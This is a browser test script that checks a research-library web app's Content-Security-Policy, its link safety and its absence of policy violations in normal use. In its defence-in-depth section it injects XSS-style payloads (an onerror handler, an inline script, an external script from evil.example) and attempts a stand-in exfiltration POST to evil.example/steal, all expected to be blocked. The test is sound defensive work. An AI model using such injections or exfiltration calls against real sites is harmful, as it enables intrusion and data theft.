// Security: Content-Security-Policy (defence in depth), safe external links, no violations in normal use.
import { readFile } from 'node:fs/promises';
import { start } from './helpers.mjs';

const { base, browser, check, finish } = await start();
const works = JSON.parse(await readFile('tests/fixtures/openalex-works.json', 'utf8'));
const crossref = JSON.parse(await readFile('tests/fixtures/crossref-works.json', 'utf8'));
const CORS = { 'access-control-allow-origin': '*', 'content-type': 'application/json' };

const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 }, acceptDownloads: true });
await ctx.route('https://api.openalex.org/**', (r) => r.fulfill({ status: 200, headers: CORS, body: JSON.stringify(works) }));
await ctx.route('https://api.crossref.org/**', (r) => r.fulfill({ status: 200, headers: CORS, body: JSON.stringify(crossref) }));
await ctx.addInitScript(() => {
  window.__csp = [];
  document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(`${e.violatedDirective} ${e.blockedURI}`));
});
const page = await ctx.newPage();
const errors = [];
page.on('pageerror', (e) => errors.push(e.message));
page.on('console', (m) => { if (m.type() === 'error' && !m.text().includes('Content Security Policy') && !m.text().includes('Failed to load resource')) errors.push(m.text()); });

// ---------- the policy ----------
await page.goto(`${base}#/dashboard`);
const csp = await page.getAttribute('meta[http-equiv="Content-Security-Policy"]', 'content');
const directive = (name) => (csp.split(';').map((d) => d.trim()).find((d) => d.startsWith(`${name} `)) ?? '');
check(Boolean(csp), 'a Content-Security-Policy is delivered with the page (meta tag: GitHub Pages cannot send headers)');
check(directive('default-src') === "default-src 'none'", "default-src 'none': everything not listed is denied");
check(!/unsafe-inline|unsafe-eval/.test(csp), "no 'unsafe-inline' or 'unsafe-eval' anywhere");
check(directive('script-src').startsWith("script-src 'self' 'sha256-") && directive('script-src').split(' ').length === 3, "scripts: this site only, plus the one hashed theme snippet");
check(directive('connect-src') === "connect-src 'self' https://api.openalex.org https://api.crossref.org", 'network requests: this site and the two scholarly APIs only');
check(directive('object-src') === "object-src 'none'" && directive('base-uri') === "base-uri 'none'" && directive('frame-src') === "frame-src 'none'", 'no plugins, no <base> rewriting, no frames');

// ---------- normal use: no violations ----------
await page.waitForSelector('[data-stat=projects]');
await page.evaluate(async () => {
  const { getRepo } = await import('/js/db/index.js'); const repo = await getRepo();
  const A = await repo.projects.create({ name: 'CSP check project' });
  const q = await repo.questions.create(A.id, { text: 'Does the policy allow normal use of the app?' });
  await repo.papers.saveToProject(A.id, { id: 'p1', title: 'A paper', authors: ['A'], year: 2022, doi: '10.1/x', url: 'https://example.org/p', abstract: 'Abstract.', sources: ['openalex'] });
  await repo.evidence.create({ projectId: A.id, paperId: 'p1', researchQuestionId: q.id, relationship: 'supports', evidence: 'e' });
});
for (const hash of ['#/projects', '#/discover?q=copilot', '#/library', '#/library/p1?tab=review', '#/library/p1?tab=evidence', '#/evidence', '#/matrix', '#/progress', '#/backup', '#/nothing']) {
  await page.goto(`${base}${hash}`);
  await page.reload();
  await page.waitForFunction(() => !document.querySelector('[aria-busy="true"]'));
  if (hash.includes('q=')) await page.waitForSelector('.paper');
}
// dialogs, the theme toggle, a download (blob URL) and a file upload are the features most likely to trip a policy
await page.goto(`${base}#/discover?q=copilot`);
await page.reload();
await page.waitForSelector('[data-save]');
await page.click('[data-save] >> nth=0');
await page.keyboard.press('Escape');
await page.click('#theme-toggle');
await page.goto(`${base}#/backup`);
await page.reload();
await page.waitForSelector('#bk-download');
const [download] = await Promise.all([page.waitForEvent('download'), page.click('#bk-download')]);
check(download.suggestedFilename().endsWith('.json'), 'backup download (a blob: URL) works under the policy');
await page.setInputFiles('#rs-file', { name: 'x.json', mimeType: 'application/json', buffer: Buffer.from('{"app":"x"}') });
await page.waitForSelector('#rs-result [role=alert]');
check((await page.evaluate(() => window.__csp)).length === 0, `no policy violations while using every page, dialogs, theme toggle, download and file upload ${JSON.stringify(await page.evaluate(() => window.__csp))}`);

// ---------- defence in depth: if markup ever slipped past escaping, the policy still stops it ----------
await page.goto(`${base}#/dashboard`);
await page.reload();
await page.waitForSelector('[data-stat=projects]');
await page.evaluate(() => {
  window.__csp.length = 0;
  document.body.insertAdjacentHTML('beforeend', '<img src="x" onerror="window.__pwn1=1"><div style="background:red" id="styled"></div>');
  const s = document.createElement('script'); s.textContent = 'window.__pwn2 = 1'; document.body.append(s);
  const ext = document.createElement('script'); ext.src = 'https://evil.example/x.js'; document.body.append(ext);
});
await page.waitForTimeout(250);
check(await page.evaluate(() => window.__pwn1 === undefined), 'an injected inline event handler (onerror) does not run');
check(await page.evaluate(() => window.__pwn2 === undefined), 'an injected inline <script> does not run');
check(await page.evaluate(() => getComputedStyle(document.getElementById('styled')).backgroundColor !== 'rgb(255, 0, 0)'), 'an injected inline style attribute is ignored');
const leaked = await page.evaluate(async () => { try { await fetch('https://evil.example/steal', { method: 'POST', body: 'data' }); return 'sent'; } catch { return 'blocked'; } });
check(leaked === 'blocked', 'a request to any other server is blocked (data cannot be sent elsewhere)');
const violations = await page.evaluate(() => window.__csp);
check(violations.some((v) => v.startsWith('script-src')) && violations.some((v) => v.startsWith('connect-src')) && violations.some((v) => v.startsWith('style-src')), `the browser reported the blocked attempts (${violations.length} violations)`);

// ---------- external links ----------
await page.goto(`${base}#/discover?q=copilot`);
await page.reload();
await page.waitForSelector('.paper');
const unsafeLinks = await page.evaluate(() => [...document.querySelectorAll('main a[href^="http"]')].filter((a) => a.target === '_blank' && !/noopener/.test(a.rel) ).length);
check(unsafeLinks === 0, 'every external link that opens a new tab has rel="noopener noreferrer"');
check((await page.locator('main a[href^="javascript:"], main a[href^="data:"]').count()) === 0, 'no javascript: or data: links on the page');

check(errors.length === 0, `no uncaught errors${errors.length ? ': ' + errors.join('; ') : ''}`);
await finish();
